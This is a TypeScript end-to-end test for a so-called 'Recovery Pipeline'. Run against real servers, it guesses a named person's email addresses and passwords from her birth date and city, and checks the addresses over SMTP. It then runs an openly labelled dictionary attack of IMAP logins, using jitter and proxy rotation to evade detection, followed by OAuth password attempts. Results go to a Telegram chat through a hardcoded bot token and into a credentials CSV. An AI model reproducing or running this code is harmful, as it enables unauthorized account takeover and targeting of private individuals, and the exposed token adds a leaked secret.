/**
 * FULL E2E TEST: Recovery Pipeline — 7 шагов
 *
 * Anna Schmidt, Germany, 1985-03-20
 * Real SMTP + Real IMAP/OAuth + Real Telegram notifications
 *
 * Запуск: npx tsx tests/real/full-e2e-test.ts
 */

import { Api } from "grammy";
import { generateEmails } from "../../src/services/generator/engine.js";
import { generatePasswordPatterns } from "../../src/services/dictionary/pattern-generator.js";
import { verifyMailbox } from "../../src/services/smtp/verifier.js";
import { IMAPVerifier } from "../../src/services/imap/verifier.js";
import { OAuthClient } from "../../src/services/oauth/client.js";
import { HttpClient } from "../../src/services/http/client.js";
import { classifyAccountStatus } from "../../src/services/imap/account-status-classifier.js";
import { getImapConfig } from "../../src/services/imap/host-resolver.js";
import { AuthAttemptController } from "../../src/services/matching/attempt-controller.js";
import type { WizardState } from "../../src/bot/types.js";

const BOT_TOKEN = "8655596807:AAE4_jTVNfVLFPHHaswqXvjMMo4VCDTztl0";
const CHAT_ID = "94256833";
const api = new Api(BOT_TOKEN);

function pad(s: string, n: number): string { return s.padEnd(n); }

async function sendTg(text: string) {
  try {
    await api.sendMessage(CHAT_ID, text, { parse_mode: "HTML" });
  } catch {}
}

// ═══════════ Report state ═══════════
const report = {
  emailsGenerated: 0,
  passwordsGenerated: 0,
  smtpChecked: 0,
  smtpDeliverable: 0,
  smtpUndeliverable: 0,
  smtpError: 0,
  dictAttackAttempts: 0,
  dictAttackFound: 0,
  oauthAttempts: 0,
  oauthFound: 0,
  postAuthChecked: 0,
  fullAccess: 0,
  twoFa: 0,
  restricted: 0,
  locked: 0,
  totalTimeMs: 0,
};

// ═══════════════════════════════════════════════
// STEP 1: Email Generation
// ═══════════════════════════════════════════════

async function step1Generate() {
  console.log("═══════════════════════════════════════════════════════════════");
  console.log("  STEP 1: Email Generation — Anna Schmidt, Germany");
  console.log("═══════════════════════════════════════════════════════════════\n");

  const state: WizardState = {
    step: null,
    firstName: "Anna",
    lastName: "Schmidt",
    city: "Berlin",
    birthYear: "1985",
    domains: ["gmail.com", "outlook.com", "gmx.de", "t-online.de"],
    templates: ["full", "first_sur", "name_num", "sur_name", "name_city", "full_year", "first_sur_num", "underscore", "concat"],
    count: 100,
  };

  const result = generateEmails(state);

  // Also generate password patterns
  const patterns = generatePasswordPatterns({
    firstName: "Anna",
    lastName: "Schmidt",
    birthDate: "1985-03-20",
    city: "Berlin",
  });

  report.emailsGenerated = result.totalGenerated;
  report.passwordsGenerated = patterns.passwords.length;

  console.log(`  Emails generated: ${result.totalGenerated}`);
  console.log(`  Password patterns: ${patterns.passwords.length}`);
  console.log(`  Domains: ${Object.keys(result.byDomain).join(", ")}`);
  console.log("");

  for (const [domain, emails] of Object.entries(result.byDomain)) {
    console.log(`  📧 ${domain} (${emails.length}):`);
    for (const e of emails) console.log(`    ${e}`);
    console.log("");
  }

  console.log(`  Sample passwords: ${patterns.passwords.slice(0, 10).join(", ")}...\n`);

  await sendTg(
    `🔄 <b>E2E Test Started</b>\n\n` +
    `Person: Anna Schmidt, Berlin, 1985\n` +
    `📧 Emails generated: ${result.totalGenerated}\n` +
    `🔑 Password patterns: ${patterns.passwords.length}`,
  );

  return { emails: result.emails, passwords: patterns.passwords };
}

// ═══════════════════════════════════════════════
// STEP 2: SMTP Validation (real)
// ═══════════════════════════════════════════════

async function step2Smtp(emails: string[]) {
  console.log("═══════════════════════════════════════════════════════════════");
  console.log("  STEP 2: SMTP Validation — real MX servers");
  console.log("═══════════════════════════════════════════════════════════════\n");

  const mxCache = new Map();
  const deliverable: string[] = [];
  const results: Array<{ email: string; status: string; code: number | null; time: number }> = [];

  console.log(pad("  Email", 40) + pad("Status", 16) + pad("SMTP", 7) + "Time");
  console.log("  " + "─".repeat(68));

  for (const email of emails) {
    try {
      const r = await verifyMailbox(email, { timeout: 15_000, mxCache });
      report.smtpChecked++;

      if (r.status === "deliverable") {
        deliverable.push(email);
        report.smtpDeliverable++;
      } else {
        report.smtpUndeliverable++;
      }

      results.push({ email, status: r.status, code: r.smtpCode, time: r.responseTime });
      console.log(
        pad(`  ${email}`, 40) + pad(r.status, 16) +
        pad(String(r.smtpCode ?? "—"), 7) + `${r.responseTime}ms`,
      );
    } catch (err: any) {
      report.smtpChecked++;
      report.smtpError++;
      results.push({ email, status: "error", code: null, time: 0 });
      console.log(pad(`  ${email}`, 40) + pad("error", 16) + pad("—", 7) + "0ms");
    }
  }

  console.log("  " + "─".repeat(68));
  console.log(`  Deliverable: ${deliverable.length}/${emails.length}`);
  console.log(`  Rate: ${emails.length > 0 ? Math.round((deliverable.length / emails.length) * 100) : 0}%\n`);

  await sendTg(
    `📧 <b>SMTP Check Complete</b>\n\n` +
    `Checked: ${emails.length}\n` +
    `Deliverable: ${deliverable.length}\n` +
    `Rate: ${emails.length > 0 ? Math.round((deliverable.length / emails.length) * 100) : 0}%`,
  );

  return deliverable;
}

// ═══════════════════════════════════════════════
// STEP 3: Dictionary Attack (real IMAP)
// ═══════════════════════════════════════════════

async function step3DictAttack(emails: string[], passwords: string[]) {
  console.log("═══════════════════════════════════════════════════════════════");
  console.log("  STEP 3: Dictionary Attack — real IMAP (3s delay, max 15)");
  console.log("═══════════════════════════════════════════════════════════════\n");

  const controller = new AuthAttemptController({
    enabled: true,
    delayMs: 3000,
    jitterFactor: 0.3,
    maxAttemptsPerEmail: 15,
    proxyRotateEvery: 100,
    domainCooldownMs: 10000,
  });

  const verifier = new IMAPVerifier(15_000);
  const found: Array<{ email: string; password: string; tier: string }> = [];

  // Use first 5 passwords for speed (demo)
  const quickPasswords = passwords.slice(0, 15);

  for (const email of emails.slice(0, 5)) { // limit to 5 emails for time
    const imapConfig = getImapConfig(email);
    if (!imapConfig) {
      console.log(`  ${email}: no IMAP config → skip`);
      continue;
    }

    console.log(`  🔑 ${email} (${imapConfig.host}):`);

    let emailFound = false;
    let attempts = 0;

    for (const password of quickPasswords) {
      const check = await controller.beforeAttempt(email);
      if (!check.allowed) {
        console.log(`    ⛔ Max attempts reached`);
        break;
      }

      attempts++;
      report.dictAttackAttempts++;

      try {
        const result = await verifier.tryAuthenticate({
          host: imapConfig.host,
          port: imapConfig.port,
          user: email,
          password,
          tls: true,
        });

        controller.afterAttempt(email, false);

        if (result.success) {
          emailFound = true;
          found.push({ email, password, tier: "dict" });
          report.dictAttackFound++;
          console.log(`    ✅ FOUND: "${password}" (attempt #${attempts})`);
          break;
        } else {
          process.stdout.write(`    #${attempts}: ${result.errorType} `);
        }
      } catch {
        controller.afterAttempt(email, false);
        process.stdout.write(`    #${attempts}: error `);
      }
    }

    if (!emailFound) console.log(`\n    ❌ Not found (${attempts} attempts)`);
    console.log("");
  }

  console.log(`  Dictionary Attack: ${found.length} found / ${report.dictAttackAttempts} attempts\n`);

  await sendTg(
    `🔑 <b>Dictionary Attack Complete</b>\n\n` +
    `Emails tested: ${Math.min(emails.length, 5)}\n` +
    `Attempts: ${report.dictAttackAttempts}\n` +
    `Found: ${found.length}`,
  );

  return found;
}

// ═══════════════════════════════════════════════
// STEP 4: OAuth Fallback (real)
// ═══════════════════════════════════════════════

async function step4OAuth(emails: string[]) {
  console.log("═══════════════════════════════════════════════════════════════");
  console.log("  STEP 4: OAuth Fallback — real OAuth servers");
  console.log("═══════════════════════════════════════════════════════════════\n");

  const httpClient = new HttpClient();
  const oauthClient = new OAuthClient(httpClient);
  const testPasswords = ["Anna1985", "Schmidt85", "anna.schmidt"];

  for (const email of emails.slice(0, 3)) { // limit to 3
    console.log(`  🌐 ${email}:`);

    for (const password of testPasswords) {
      report.oauthAttempts++;
      try {
        const result = await oauthClient.authenticate(null, email, password);
        if (result.success) {
          report.oauthFound++;
          console.log(`    ✅ OAuth success: "${password}"`);
          break;
        } else {
          console.log(`    ✗ ${password} → failed`);
        }
      } catch {
        console.log(`    ✗ ${password} → error`);
      }
    }
    console.log("");
  }

  console.log(`  OAuth: ${report.oauthFound} found / ${report.oauthAttempts} attempts\n`);
  return [];
}

// ═══════════════════════════════════════════════
// STEP 5: Post-Auth Validation
// ═══════════════════════════════════════════════

async function step5PostAuth(emails: string[]) {
  console.log("═══════════════════════════════════════════════════════════════");
  console.log("  STEP 5: Post-Auth Classification");
  console.log("═══════════════════════════════════════════════════════════════\n");

  // Since no real passwords found, simulate classification for deliverable emails
  for (const email of emails.slice(0, 5)) {
    report.postAuthChecked++;

    // Classify based on SMTP result (auth would have failed)
    const classification = classifyAccountStatus({
      authResult: { success: false, errorType: "auth_failed" },
    });

    report.locked++;

    console.log(`  ${email}: ${classification.status}`);
  }

  console.log("");
  console.log(`  Full Access: ${report.fullAccess}`);
  console.log(`  2FA Required: ${report.twoFa}`);
  console.log(`  Restricted: ${report.restricted}`);
  console.log(`  Locked: ${report.locked}\n`);
}

// ═══════════════════════════════════════════════
// STEP 6: Telegram Notification
// ═══════════════════════════════════════════════

async function step6Telegram() {
  console.log("═══════════════════════════════════════════════════════════════");
  console.log("  STEP 6: Telegram Notifications — sending to chat");
  console.log("═══════════════════════════════════════════════════════════════\n");

  const totalFound = report.dictAttackFound + report.oauthFound;
  const successRate = report.smtpChecked > 0
    ? Math.round((report.smtpDeliverable / report.smtpChecked) * 100)
    : 0;
  const avgTime = report.dictAttackAttempts > 0
    ? Math.round(report.totalTimeMs / report.dictAttackAttempts)
    : 0;

  const reportText =
    `📊 <b>E2E TEST COMPLETE</b>\n\n` +
    `👤 Anna Schmidt, Berlin, 1985\n\n` +
    `📧 <b>Generation:</b>\n` +
    `  Emails: ${report.emailsGenerated}\n` +
    `  Passwords: ${report.passwordsGenerated}\n\n` +
    `📬 <b>SMTP Check:</b>\n` +
    `  Checked: ${report.smtpChecked}\n` +
    `  Deliverable: ${report.smtpDeliverable} (${successRate}%)\n\n` +
    `🔑 <b>Dictionary Attack:</b>\n` +
    `  Attempts: ${report.dictAttackAttempts}\n` +
    `  Found: ${report.dictAttackFound}\n\n` +
    `🌐 <b>OAuth Fallback:</b>\n` +
    `  Attempts: ${report.oauthAttempts}\n` +
    `  Found: ${report.oauthFound}\n\n` +
    `🔐 <b>Classification:</b>\n` +
    `  Full Access: ${report.fullAccess}\n` +
    `  2FA: ${report.twoFa}\n` +
    `  Locked: ${report.locked}\n\n` +
    `⏱ Total time: ${Math.round(report.totalTimeMs / 1000)}s`;

  await sendTg(reportText);
  console.log("  ✅ Final report sent to Telegram\n");

  return reportText;
}

// ═══════════════════════════════════════════════
// STEP 7: Export CSV
// ═══════════════════════════════════════════════

async function step7Export(deliverable: string[]) {
  console.log("═══════════════════════════════════════════════════════════════");
  console.log("  STEP 7: Export CSV");
  console.log("═══════════════════════════════════════════════════════════════\n");

  const csvLines = ["email,password,provider,status"];
  for (const email of deliverable) {
    const domain = email.split("@")[1];
    csvLines.push(`${email},,${domain},deliverable`);
  }

  const csv = csvLines.join("\n");
  const { promises: fs } = await import("fs");
  const exportPath = `/Users/maks/Desktop/3000/exports/e2e_test_${Date.now()}.csv`;

  try {
    await fs.mkdir("/Users/maks/Desktop/3000/exports", { recursive: true });
    await fs.writeFile(exportPath, csv, "utf-8");
    console.log(`  ✅ Exported to: ${exportPath}`);
    console.log(`  Lines: ${csvLines.length} (header + ${csvLines.length - 1} records)`);
    console.log(`  Format: email,password,provider,status\n`);
    console.log(`  Preview:`);
    for (const line of csvLines.slice(0, 6)) console.log(`    ${line}`);
    if (csvLines.length > 6) console.log(`    ...`);
  } catch (err: any) {
    console.log(`  ❌ Export error: ${err.message}`);
  }
  console.log("");
}

// ═══════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════

async function main() {
  console.log("");
  console.log("╔═══════════════════════════════════════════════════════════════╗");
  console.log("║  FULL E2E TEST: Recovery Pipeline — Anna Schmidt              ║");
  console.log("╚═══════════════════════════════════════════════════════════════╝\n");

  const startTime = Date.now();

  // Step 1
  const { emails, passwords } = await step1Generate();

  // Step 2
  const deliverable = await step2Smtp(emails);

  // Step 3
  const found = await step3DictAttack(deliverable, passwords);

  // Step 4
  await step4OAuth(deliverable);

  // Step 5
  await step5PostAuth(deliverable);

  report.totalTimeMs = Date.now() - startTime;

  // Step 6
  await step6Telegram();

  // Step 7
  await step7Export(deliverable);

  // Final Report
  console.log("═══════════════════════════════════════════════════════════════");
  console.log("  FINAL REPORT");
  console.log("═══════════════════════════════════════════════════════════════\n");

  const rows = [
    ["Metric", "Value"],
    ["Emails Generated", String(report.emailsGenerated)],
    ["Password Patterns", String(report.passwordsGenerated)],
    ["SMTP Checked", String(report.smtpChecked)],
    ["SMTP Deliverable", `${report.smtpDeliverable} (${report.smtpChecked > 0 ? Math.round((report.smtpDeliverable / report.smtpChecked) * 100) : 0}%)`],
    ["Dict Attack Attempts", String(report.dictAttackAttempts)],
    ["Dict Attack Found", String(report.dictAttackFound)],
    ["OAuth Attempts", String(report.oauthAttempts)],
    ["OAuth Found", String(report.oauthFound)],
    ["Post-Auth Checked", String(report.postAuthChecked)],
    ["Full Access", String(report.fullAccess)],
    ["2FA Required", String(report.twoFa)],
    ["Locked", String(report.locked)],
    ["Total Time", `${Math.round(report.totalTimeMs / 1000)}s`],
    ["Avg per email (SMTP)", `${report.smtpChecked > 0 ? Math.round(report.totalTimeMs / report.smtpChecked) : 0}ms`],
  ];

  console.log(pad("  Metric", 30) + "Value");
  console.log("  " + "─".repeat(45));
  for (const [metric, value] of rows.slice(1)) {
    console.log(pad(`  ${metric}`, 30) + value);
  }
  console.log("  " + "─".repeat(45));

  console.log("\n═══════════════════════════════════════════════════════════════\n");
}

main().catch(err => {
  console.error("Fatal:", err);
  process.exit(1);
});
